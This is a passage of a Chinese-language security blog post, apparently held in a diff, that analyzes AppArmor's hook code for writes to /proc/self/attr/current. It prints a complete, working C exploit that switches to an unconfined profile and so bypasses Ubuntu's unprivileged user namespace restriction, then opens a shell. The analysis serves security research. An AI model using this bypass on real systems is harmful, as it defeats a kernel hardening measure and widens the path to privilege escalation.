class="line">		<span class="keyword">return</span> hp-&gt;hook.setprocattr(name, value, size);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> LSM_RET_DEFAULT(setprocattr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>從這裡可以找到 hook 的函數是 <code>apparmor_setprocattr</code>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /security/apparmor/lsm.c</span></span><br><span class="line"></span><br><span class="line">atic <span class="class"><span class="keyword">struct</span> <span class="title">security_hook_list</span> <span class="title">apparmor_hooks</span>[] __<span class="title">ro_after_init</span> =</span> &#123;</span><br><span class="line">	...</span><br><span class="line">	LSM_HOOK_INIT(getselfattr, apparmor_getselfattr),</span><br><span class="line">	LSM_HOOK_INIT(setselfattr, apparmor_setselfattr),</span><br><span class="line">	LSM_HOOK_INIT(getprocattr, apparmor_getprocattr),</span><br><span class="line">	LSM_HOOK_INIT(setprocattr, apparmor_setprocattr),</span><br><span class="line">	...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>向下追可以看到，先找到要設定的屬性，若修改 current 就會轉換成對應 id<br>接下來 call <code>do_attr</code> 來設定該 attribute  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /security/apparmor/lsm.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">apparmor_setprocattr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">void</span> *value,</span></span><br><span class="line"><span class="params">				<span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> attr = lsm_name_to_attr(name);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (attr)</span><br><span class="line">		<span class="keyword">return</span> do_setattr(attr, value, size);</span><br><span class="line">	<span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// security/lsm_syscall.c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * lsm_name_to_attr - map an LSM attribute name to its ID</span></span><br><span class="line"><span class="comment"> * @name: name of the attribute</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the LSM attribute value associated with @name, or 0 if</span></span><br><span class="line"><span class="comment"> * there is no mapping.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u64 <span class="title function_">lsm_name_to_attr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;current&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span> LSM_ATTR_CURRENT;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;exec&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span> LSM_ATTR_EXEC;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;fscreate&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span> LSM_ATTR_FSCREATE;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;keycreate&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span> LSM_ATTR_KEYCREATE;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;prev&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span> LSM_ATTR_PREV;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">strcmp</span>(name, <span class="string">&quot;sockcreate&quot;</span>))</span><br><span class="line">		<span class="keyword">return</span> LSM_ATTR_SOCKCREATE;</span><br><span class="line">	<span class="keyword">return</span> LSM_ATTR_UNDEF;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>AppArmor 要處理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;command&gt; &lt;args&gt;&quot; &gt; /proc/self/attr/current</span><br><span class="line">echo &quot;&lt;command&gt; &lt;args&gt;&quot; &gt; /proc/self/attr/exec</span><br></pre></td></tr></table></figure>
+
+<p>這個 function 就是解析 command，然後呼叫對應的 aa_change_profile &#x2F; aa_setprocattr_changehat 等 API</p>
+<p>所以通過這個方式可以簡單的去操作當前使用的 unconfined profile 了，如通過 <code>aa_change_profile</code> 來去設定當前 profile flags，或是當前 profile 是哪個等等，完美~</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// security/apparmor/lsm.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_setattr</span><span class="params">(u64 attr, <span class="type">void</span> *value, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *command, *largs = <span class="literal">NULL</span>, *args = value;</span><br><span class="line">	<span class="type">size_t</span> arg_size;</span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line">	DEFINE_AUDIT_DATA(ad, LSM_AUDIT_DATA_NONE, AA_CLASS_NONE,</span><br><span class="line">			  OP_SETPROCATTR);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* AppArmor requires that the buffer must be null terminated atm */</span></span><br><span class="line">	<span class="keyword">if</span> (args[size - <span class="number">1</span>] != <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">		<span class="comment">/* null terminate */</span></span><br><span class="line">		largs = args = kmalloc(size + <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line">		<span class="keyword">if</span> (!args)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">		<span class="built_in">memcpy</span>(args, value, size);</span><br><span class="line">		args[size] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = -EINVAL;</span><br><span class="line">	args = strim(args);</span><br><span class="line">	command = strsep(&amp;args, <span class="string">&quot; &quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!args)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	args = skip_spaces(args);</span><br><span class="line">	<span class="keyword">if</span> (!*args)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	arg_size = size - (args - (largs ? largs : (<span class="type">char</span> *) value));</span><br><span class="line">	<span class="keyword">if</span> (attr == LSM_ATTR_CURRENT) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;changehat&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			error = aa_setprocattr_changehat(args, arg_size,</span><br><span class="line">							 AA_CHANGE_NOFLAGS);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;permhat&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			error = aa_setprocattr_changehat(args, arg_size,</span><br><span class="line">							 AA_CHANGE_TEST);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;changeprofile&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			error = aa_change_profile(args, AA_CHANGE_NOFLAGS);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;permprofile&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			error = aa_change_profile(args, AA_CHANGE_TEST);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;stack&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			error = aa_change_profile(args, AA_CHANGE_STACK);</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (attr == LSM_ATTR_EXEC) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;exec&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">			error = aa_change_profile(args, AA_CHANGE_ONEXEC);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(command, <span class="string">&quot;stack&quot;</span>) == <span class="number">0</span>)</span><br><span class="line">			error = aa_change_profile(args, (AA_CHANGE_ONEXEC |</span><br><span class="line">							 AA_CHANGE_STACK));</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">goto</span> fail;</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="comment">/* only support the &quot;current&quot; and &quot;exec&quot; process attributes */</span></span><br><span class="line">		<span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!error)</span><br><span class="line">		error = size;</span><br><span class="line">out:</span><br><span class="line">	kfree(largs);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">	ad.subj_label = begin_current_label_crit_section();</span><br><span class="line">	<span class="keyword">if</span> (attr == LSM_ATTR_CURRENT)</span><br><span class="line">		ad.info = <span class="string">&quot;current&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (attr == LSM_ATTR_EXEC)</span><br><span class="line">		ad.info = <span class="string">&quot;exec&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ad.info = <span class="string">&quot;invalid&quot;</span>;</span><br><span class="line">	ad.error = error = -EINVAL;</span><br><span class="line">	aa_audit_msg(AUDIT_APPARMOR_DENIED, &amp;ad, <span class="literal">NULL</span>);</span><br><span class="line">	end_current_label_crit_section(ad.subj_label);</span><br><span class="line">	<span class="keyword">goto</span> out;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p>首先其實蠻清楚應該要做甚麼的，他檢查了兩項，現在可以通過 &#x2F;proc&#x2F;self&#x2F;attr&#x2F;current 的 <code>changeprofile</code> 來去切換當前使用的 profile<br>那他檢查了當前是不是預設的 unconfined，因此只要找到機器上其他 uncondined 的 profile change 過去就好了，可以通過 <code>aa-status</code> 來看機器上有哪些，舉例來說 <code>toybox</code> 之類的 profile  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (profile_unconfined(profile) &amp;&amp;</span><br><span class="line">	profile == profiles_ns(profile)-&gt;unconfined) &#123;</span><br></pre></td></tr></table></figure>
+
+<p>以下是完整 exploit</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CURRENT_PATH <span class="string">&quot;/proc/self/attr/current&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> cmd[] = <span class="string">&quot;changeprofile toybox&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">w</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *p, <span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> f = open(p, O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span> (f &lt; <span class="number">0</span>) <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    write(f, s, <span class="built_in">strlen</span>(s));</span><br><span class="line">    close(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(CURRENT_PATH, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] error to open current\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> ret = write(fd, cmd, <span class="keyword">sizeof</span>(cmd));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] error to send cmd\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unshare(CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] error to open unprivilege user namespace&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    w(<span class="string">&quot;/proc/self/setgroups&quot;</span>, <span class="string">&quot;deny&quot;</span>);</span><br><span class="line">    w(<span class="string">&quot;/proc/self/uid_map&quot;</span>, <span class="string">&quot;0 1000 1&quot;</span>);</span><br><span class="line">    w(<span class="string">&quot;/proc/self/gid_map&quot;</span>, <span class="string">&quot;0 1000 1&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><iframe width="560" height="315" src="https://www.youtube.com/embed/vR0mA53JZTk?si=6jzydcPRZKSHlccz" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>遇到最大的坑是我 VM 的 grub 進不去XD</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        <img data-src="/images/posts_cover/LinuxKernelPwn/linuxkernel.png" data-sizes="auto" alt="Linux-Kernel-analyze-pipe" class="lazyload">
+      
+      <a href="/2025/10/24/Linux-Kernel-analyze-pipe/"></a>
+      <div class="article-nav-caption">Older</div>
+      <h3 class="article-nav-title">
+        
+          Linux-Kernel-analyze-pipe
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      Naup堇姬
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        205.9k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        18:01
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Analyze-AppArmor-and-Ubuntu%E2%80%99s-Unprivileged-Namespace-Restriction-bypass"><span class="toc-number">1.</span> <span class="toc-text">Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Unprivileged-User-Namespace"><span class="toc-number">1.2.</span> <span class="toc-text">Unprivileged User Namespace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#AppArmor"><span class="toc-number">1.3.</span> <span class="toc-text">AppArmor</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#build-env"><span class="toc-number">1.4.</span> <span class="toc-text">build env</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">1.5.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">1.6.</span> <span class="toc-text">exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demo"><span class="toc-number">1.7.</span> <span class="toc-text">demo</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">1.8.</span> <span class="toc-text">After all</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Naup堇姬" class="lazyload">
+  <div class="sidebar-author-name">Naup堇姬</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Posts</div>
+    <div class="sidebar-state-number">85</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Categories</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tags</div>
+    <div class="sidebar-state-number">21</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-email sidebar-social-icon">
+      <a href=naup96721@gmail.com itemprop="url" target="_blank" aria-label="email" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/Naupjjin itemprop="url" target="_blank" aria-label="github" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Naup堇姬",
+          title: "Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass",
+          url: "http://example.com/2025/11/21/Ubuntu-Unprivileged-user-namespace-and-apparmor/",
+          excerpt: "",
+          description: "",
+          stripContent: "Analyze AppArmor and Ubuntu’s Unprivileged Namespace Restriction bypass Author : 堇姬 Naup  前言最近剛好遇到 AppArmor 相關的東東，突然想到 pumpkin 寫過的這篇https://u1f383.github.io/linux/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction.html   以",
+          date: "Fri Nov 21 2025 16:56:24 GMT+0800",
+          updated: "Fri Nov 21 2025 17:04:02 GMT+0800",
+          cover: "https://i.postimg.cc/bJwcgqPx/131939316-p0.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
